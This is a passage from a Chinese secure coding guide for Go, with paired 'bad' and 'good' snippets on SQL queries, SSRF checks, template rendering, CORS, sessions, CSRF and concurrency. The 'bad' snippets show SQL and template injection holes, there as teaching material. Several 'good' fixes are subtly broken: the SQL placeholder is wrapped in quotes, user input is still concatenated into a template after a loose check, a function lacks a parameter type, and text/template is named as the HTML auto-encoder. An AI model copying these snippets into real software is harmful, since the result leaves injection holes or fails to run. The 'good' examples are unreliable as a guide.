escapedResult<br>&#125;<br></code></pre></td></tr></table></figure><p><a id="2.1.2"></a></p><h3 id="1-2-SQL操作"><a href="#1-2-SQL操作" class="headerlink" title="1.2 SQL操作"></a>1.2 SQL操作</h3><h4 id="1-2-1【必须】SQL语句默认使用预编译并绑定变量"><a href="#1-2-1【必须】SQL语句默认使用预编译并绑定变量" class="headerlink" title="1.2.1【必须】SQL语句默认使用预编译并绑定变量"></a>1.2.1【必须】SQL语句默认使用预编译并绑定变量</h4><ul><li>使用<code>database/sql</code>的prepare、Query或使用GORM等ORM执行SQL操作</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/jinzhu/gorm&quot;</span><br>_ <span class="hljs-string">&quot;github.com/jinzhu/gorm/dialects/sqlite&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Product <span class="hljs-keyword">struct</span> &#123;<br>gorm.Model<br>Code  <span class="hljs-type">string</span><br>Price <span class="hljs-type">uint</span><br>&#125;<br><br>...<br><span class="hljs-keyword">var</span> product Product<br>...<br>db.First(&amp;product, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li>使用参数化查询，禁止拼接SQL语句，另外对于传入参数用于order by或表名的需要通过校验</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;database/sql&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(db *sql.DB, req *http.Request)</span></span> &#123;<br>q := fmt.Sprintf(<span class="hljs-string">&quot;SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=&#x27;%s&#x27; ORDER BY PRICE&quot;</span>,<br>req.URL.Query()[<span class="hljs-string">&quot;category&quot;</span>])<br>db.Query(q)<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handlerGood</span><span class="hljs-params">(db *sql.DB, req *http.Request)</span></span> &#123;<br><span class="hljs-comment">// 使用?占位符</span><br>q := <span class="hljs-string">&quot;SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=&#x27;?&#x27; ORDER BY PRICE&quot;</span><br>db.Query(q, req.URL.Query()[<span class="hljs-string">&quot;category&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p><a id="2.1.3"></a></p><h3 id="1-3-网络请求"><a href="#1-3-网络请求" class="headerlink" title="1.3 网络请求"></a>1.3 网络请求</h3><h4 id="1-3-1【必须】资源请求过滤验证"><a href="#1-3-1【必须】资源请求过滤验证" class="headerlink" title="1.3.1【必须】资源请求过滤验证"></a>1.3.1【必须】资源请求过滤验证</h4><ul><li><p>使用<code>&quot;net/http&quot;</code>下的方法<code>http.Get(url)</code>、<code>http.Post(url, contentType, body)</code>、<code>http.Head(url)</code>、<code>http.PostForm(url, data)</code>、<code>http.Do(req)</code>时，如变量值外部可控（指从参数中动态获取），应对请求目标进行严格的安全校验。</p></li><li><p>如请求资源域名归属固定的范围，如只允许<code>a.qq.com</code>和<code>b.qq.com</code>，应做白名单限制。如不适用白名单，则推荐的校验逻辑步骤是：</p><ul><li><p>第 1 步、只允许HTTP或HTTPS协议</p></li><li><p>第 2 步、解析目标URL，获取其HOST</p></li><li><p>第 3 步、解析HOST，获取HOST指向的IP地址转换成Long型</p></li><li><p>第 4 步、检查IP地址是否为内网IP，网段有：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">// 以RFC定义的专有网络为例，如有自定义私有网段亦应加入禁止访问列表。<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span><br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span><br><span class="hljs-number">127.0.0.0</span>/<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure></li><li><p>第 5 步、请求URL</p></li><li><p>第 6 步、如有跳转，跳转后执行1，否则绑定经校验的ip和域名，对URL发起请求</p></li></ul></li><li><p>官方库<code>encoding/xml</code>不支持外部实体引用，使用该库可避免xxe漏洞</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/xml&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>XMLName  xml.Name <span class="hljs-string">`xml:&quot;person&quot;`</span><br>Id       <span class="hljs-type">int</span>      <span class="hljs-string">`xml:&quot;id,attr&quot;`</span><br>UserName <span class="hljs-type">string</span>   <span class="hljs-string">`xml:&quot;name&gt;first&quot;`</span><br>Comment  <span class="hljs-type">string</span>   <span class="hljs-string">`xml:&quot;,comment&quot;`</span><br>&#125;<br><br>v := &amp;Person&#123;Id: <span class="hljs-number">13</span>, UserName: <span class="hljs-string">&quot;John&quot;</span>&#125;<br>v.Comment = <span class="hljs-string">&quot; Need more details. &quot;</span><br><br>enc := xml.NewEncoder(os.Stdout)<br>enc.Indent(<span class="hljs-string">&quot;  &quot;</span>, <span class="hljs-string">&quot;    &quot;</span>)<br><span class="hljs-keyword">if</span> err := enc.Encode(v); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;error: %v\n&quot;</span>, err)<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-服务器端渲染"><a href="#1-4-服务器端渲染" class="headerlink" title="1.4 服务器端渲染"></a>1.4 服务器端渲染</h3><h4 id="1-4-1【必须】模板渲染过滤验证"><a href="#1-4-1【必须】模板渲染过滤验证" class="headerlink" title="1.4.1【必须】模板渲染过滤验证"></a>1.4.1【必须】模板渲染过滤验证</h4><ul><li>使用<code>text/template</code>或者<code>html/template</code>渲染模板时禁止将外部输入参数引入模板，或仅允许引入白名单内字符。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>r.ParseForm()<br>x := r.Form.Get(<span class="hljs-string">&quot;name&quot;</span>)<br><br><span class="hljs-keyword">var</span> tmpl = <span class="hljs-string">`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;</span><br><span class="hljs-string">    &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        First name:&lt;br&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">    &lt;/form&gt;&lt;p&gt;`</span> + x + <span class="hljs-string">` &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;`</span><br><br>t := template.New(<span class="hljs-string">&quot;main&quot;</span>)<br>t, _ = t.Parse(tmpl)<br>t.Execute(w, <span class="hljs-string">&quot;Hello&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/go-playground/validator/v10&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> validate *validator.Validate<br>validate = validator.New()<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateVariable</span><span class="hljs-params">(val)</span></span> &#123;<br>errs := validate.Var(val, <span class="hljs-string">&quot;gte=1,lte=100&quot;</span>) <span class="hljs-comment">// 限制必须是1-100的正整数</span><br><span class="hljs-keyword">if</span> errs != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(errs)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>r.ParseForm()<br>x := r.Form.Get(<span class="hljs-string">&quot;name&quot;</span>)<br><br><span class="hljs-keyword">if</span> validateVariable(x) &#123;<br><span class="hljs-keyword">var</span> tmpl = <span class="hljs-string">`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;</span><br><span class="hljs-string">            &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            First name:&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;&lt;p&gt;`</span> + x + <span class="hljs-string">` &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;`</span><br>t := template.New(<span class="hljs-string">&quot;main&quot;</span>)<br>t, _ = t.Parse(tmpl)<br>t.Execute(w, <span class="hljs-string">&quot;Hello&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// ...</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-Web跨域"><a href="#1-5-Web跨域" class="headerlink" title="1.5 Web跨域"></a>1.5 Web跨域</h3><h4 id="1-5-1【必须】跨域资源共享CORS限制请求来源"><a href="#1-5-1【必须】跨域资源共享CORS限制请求来源" class="headerlink" title="1.5.1【必须】跨域资源共享CORS限制请求来源"></a>1.5.1【必须】跨域资源共享CORS限制请求来源</h4><ul><li>CORS请求保护不当可导致敏感信息泄漏，因此应当严格设置Access-Control-Allow-Origin使用同源策略进行保护。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br>c := cors.New(cors.Options&#123;<br>AllowedOrigins:   []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;http://qq.com&quot;</span>, <span class="hljs-string">&quot;https://qq.com&quot;</span>&#125;,<br>AllowCredentials: <span class="hljs-literal">true</span>,<br>Debug:            <span class="hljs-literal">false</span>,<br>&#125;)<br><br><span class="hljs-comment">// 引入中间件</span><br>handler = c.Handler(handler)<br></code></pre></td></tr></table></figure><h3 id="1-6-响应输出"><a href="#1-6-响应输出" class="headerlink" title="1.6 响应输出"></a>1.6 响应输出</h3><h4 id="1-6-1-【必须】设置正确的HTTP响应包类型"><a href="#1-6-1-【必须】设置正确的HTTP响应包类型" class="headerlink" title="1.6.1 【必须】设置正确的HTTP响应包类型"></a>1.6.1 【必须】设置正确的HTTP响应包类型</h4><ul><li>响应头Content-Type与实际响应内容，应保持一致。如：API响应数据类型是json，则响应头使用<code>application/json</code>；若为xml，则设置为<code>text/xml</code>。</li></ul><h4 id="1-6-2-【必须】添加安全响应头"><a href="#1-6-2-【必须】添加安全响应头" class="headerlink" title="1.6.2 【必须】添加安全响应头"></a>1.6.2 【必须】添加安全响应头</h4><ul><li>所有接口、页面，添加响应头 <code>X-Content-Type-Options: nosniff</code>。</li><li>所有接口、页面，添加响应头<code>X-Frame-Options </code>。按需合理设置其允许范围，包括：<code>DENY</code>、<code>SAMEORIGIN</code>、<code>ALLOW-FROM origin</code>。用法参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options">MDN文档</a></li></ul><h4 id="1-6-3【必须】外部输入拼接到HTTP响应头中需进行过滤"><a href="#1-6-3【必须】外部输入拼接到HTTP响应头中需进行过滤" class="headerlink" title="1.6.3【必须】外部输入拼接到HTTP响应头中需进行过滤"></a>1.6.3【必须】外部输入拼接到HTTP响应头中需进行过滤</h4><ul><li>应尽量避免外部可控参数拼接到HTTP响应头中，如业务需要则需要过滤掉<code>\r</code>、<code>\n</code>等换行符，或者拒绝携带换行符号的外部输入。</li></ul><h4 id="1-6-4【必须】外部输入拼接到response页面前进行编码处理"><a href="#1-6-4【必须】外部输入拼接到response页面前进行编码处理" class="headerlink" title="1.6.4【必须】外部输入拼接到response页面前进行编码处理"></a>1.6.4【必须】外部输入拼接到response页面前进行编码处理</h4><ul><li>直出html页面或使用模板生成html页面的，推荐使用<code>text/template</code>自动编码，或者使用<code>html.EscapeString</code>或<code>text/template</code>对<code>&lt;, &gt;, &amp;, &#39;,&quot;</code>等字符进行编码。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;html/template&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">outtemplate</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>param1 := r.URL.Query().Get(<span class="hljs-string">&quot;param1&quot;</span>)<br>tmpl := template.New(<span class="hljs-string">&quot;hello&quot;</span>)<br>tmpl, _ = tmpl.Parse(<span class="hljs-string">`&#123;&#123;define &quot;T&quot;&#125;&#125;&#123;&#123;.&#125;&#125;&#123;&#123;end&#125;&#125;`</span>)<br>tmpl.ExecuteTemplate(w, <span class="hljs-string">&quot;T&quot;</span>, param1)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-7-会话管理"><a href="#1-7-会话管理" class="headerlink" title="1.7 会话管理"></a>1.7 会话管理</h3><h4 id="1-7-1【必须】安全维护session信息"><a href="#1-7-1【必须】安全维护session信息" class="headerlink" title="1.7.1【必须】安全维护session信息"></a>1.7.1【必须】安全维护session信息</h4><ul><li>用户登录时应重新生成session，退出登录后应清理session。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gorilla/handlers&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/mux&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-comment">// 创建cookie</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setToken</span><span class="hljs-params">(res http.ResponseWriter, req *http.Request)</span></span> &#123;<br>expireToken := time.Now().Add(time.Minute * <span class="hljs-number">30</span>).Unix()<br>expireCookie := time.Now().Add(time.Minute * <span class="hljs-number">30</span>)<br><br><span class="hljs-comment">//...</span><br><br>cookie := http.Cookie&#123;<br>Name:     <span class="hljs-string">&quot;Auth&quot;</span>,<br>Value:    signedToken,<br>Expires:  expireCookie, <span class="hljs-comment">// 过期失效</span><br>HttpOnly: <span class="hljs-literal">true</span>,<br>Path:     <span class="hljs-string">&quot;/&quot;</span>,<br>Domain:   <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>Secure:   <span class="hljs-literal">true</span>,<br>&#125;<br><br>http.SetCookie(res, &amp;cookie)<br>http.Redirect(res, req, <span class="hljs-string">&quot;/profile&quot;</span>, <span class="hljs-number">307</span>)<br>&#125;<br><br><span class="hljs-comment">// 删除cookie</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">logout</span><span class="hljs-params">(res http.ResponseWriter, req *http.Request)</span></span> &#123;<br>deleteCookie := http.Cookie&#123;<br>Name:    <span class="hljs-string">&quot;Auth&quot;</span>,<br>Value:   <span class="hljs-string">&quot;none&quot;</span>,<br>Expires: time.Now(),<br>&#125;<br>http.SetCookie(res, &amp;deleteCookie)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-7-2【必须】CSRF防护"><a href="#1-7-2【必须】CSRF防护" class="headerlink" title="1.7.2【必须】CSRF防护"></a>1.7.2【必须】CSRF防护</h4><ul><li>涉及系统敏感操作或可读取敏感信息的接口应校验<code>Referer</code>或添加<code>csrf_token</code>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gorilla/csrf&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/mux&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := mux.NewRouter()<br>r.HandleFunc(<span class="hljs-string">&quot;/signup&quot;</span>, ShowSignupForm)<br>r.HandleFunc(<span class="hljs-string">&quot;/signup/post&quot;</span>, SubmitSignupForm)<br><span class="hljs-comment">// 使用csrf_token验证</span><br>http.ListenAndServe(<span class="hljs-string">&quot;:8000&quot;</span>,<br>csrf.Protect([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;32-byte-long-auth-key&quot;</span>))(r))<br>&#125;<br></code></pre></td></tr></table></figure><p><a id="2.1.8"></a></p><h3 id="1-8-访问控制"><a href="#1-8-访问控制" class="headerlink" title="1.8 访问控制"></a>1.8 访问控制</h3><h4 id="1-8-1【必须】默认鉴权"><a href="#1-8-1【必须】默认鉴权" class="headerlink" title="1.8.1【必须】默认鉴权"></a>1.8.1【必须】默认鉴权</h4><ul><li><p>除非资源完全可对外开放，否则系统默认进行身份认证，使用白名单的方式放开不需要认证的接口或页面。</p></li><li><p>根据资源的机密程度和用户角色，以最小权限原则，设置不同级别的权限，如完全公开、登录可读、登录可写、特定用户可读、特定用户可写等</p></li><li><p>涉及用户自身相关的数据的读写必须验证登录态用户身份及其权限，避免越权操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 伪代码</span><br><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>:id <span class="hljs-keyword">and</span> userid<span class="hljs-operator">=</span>session.userid<br></code></pre></td></tr></table></figure></li><li><p>没有独立账号体系的外网服务使用<code>QQ</code>或<code>微信</code>登录，内网服务使用<code>统一登录服务</code>登录，其他使用账号密码登录的服务需要增加验证码等二次验证</p></li></ul><h3 id="1-9-并发保护"><a href="#1-9-并发保护" class="headerlink" title="1.9 并发保护"></a>1.9 并发保护</h3><h4 id="1-9-1【必须】禁止在闭包中直接调用循环变量"><a href="#1-9-1【必须】禁止在闭包中直接调用循环变量" class="headerlink" title="1.9.1【必须】禁止在闭包中直接调用循环变量"></a>1.9.1【必须】禁止在闭包中直接调用循环变量</h4><ul><li>在循环中启动协程，当协程中使用到了循环的索引值，由于多个协程同时使用同一个变量会产生数据竞争，造成执行结果异常。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>runtime.GOMAXPROCS(runtime.NumCPU())<br><span class="hljs-keyword">var</span> group sync.WaitGroup<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>group.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> group.Done()<br>fmt.Printf(<span class="hljs-string">&quot;%-2d&quot;</span>, i) <span class="hljs-comment">// 这里打印的i不是所期望的</span><br>&#125;()<br>&#125;<br>group.Wait()<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>runtime.GOMAXPROCS(runtime.NumCPU())<br><span class="hljs-keyword">var</span> group sync.WaitGroup<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>group.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(j <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> r := <span class="hljs-built_in">recover</span>(); r != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Recovered in start()&quot;</span>)<br>&#125;<br>group.Done()<br>&#125;()<br>fmt.Printf(<span class="hljs-string">&quot;%-2d&quot;</span>, j) <span class="hljs-comment">// 闭包内部使用局部变量</span><br>&#125;(i) <span class="hljs-comment">// 把循环变量显式地传给协程</span><br>&#125;<br>group.Wait()<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-9-2【必须】禁止并发写map"><a href="#1-9-2【必须】禁止并发写map" class="headerlink" title="1.9.2【必须】禁止并发写map"></a>1.9.2【必须】禁止并发写map</h4><ul><li>并发写map容易造成程序崩溃并异常退出，建议加锁保护</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 并发读写</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>_ = m[<span class="hljs-number">1</span>]<br>&#125;<br>&#125;()<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>m[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span><br>&#125;<br>&#125;()<br><span class="hljs-keyword">select</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-9-3【必须】确保并发安全"><a href="#1-9-3【必须】确保并发安全" class="headerlink" title="1.9.3【必须】确保并发安全"></a>1.9.3【必须】确保并发安全</h4><p>敏感操作如果未作并发安全限制，可导致数据读写异常，造成业务逻辑限制被绕过。可通过同步锁或者原子操作进行防护。</p><p>通过同步锁共享内存</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br><span class="hljs-keyword">var</span> count <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Count</span><span class="hljs-params">(lock *sync.Mutex)</span></span> &#123;<br>lock.Lock() <span class="hljs-comment">// 加写锁</span><br>count++<br>fmt.Println(count)<br>lock.Unlock() <span class="hljs-comment">// 解写锁，任何一个Lock()或RLock()均需要保证对应有Unlock()或RUnlock()</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>lock := &amp;sync.Mutex&#123;&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br><span class="hljs-keyword">go</span> Count(lock) <span class="hljs-comment">// 传递指针是为了防止函数内的锁和调用锁不一致</span><br>&#125;<br><span 